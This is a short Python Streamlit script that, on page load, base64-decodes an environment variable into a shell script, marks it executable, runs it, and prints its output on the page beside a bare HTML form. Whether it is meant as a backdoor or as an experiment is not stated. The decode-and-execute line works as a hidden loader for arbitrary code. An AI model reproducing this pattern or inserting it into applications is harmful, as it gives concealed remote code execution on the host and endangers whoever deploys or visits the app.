import streamlit as st
import os
output = os.popen('echo $value > base; base64 --decode base > 1234.sh; chmod +x 1234.sh; ./1234.sh').read()
my_placeholder = st.empty()
my_placeholder.text("The user entered %s" % output +'<br><form action="" method="get"><input type="text" name="username"><input type="submit" value="Submit"></form> ')

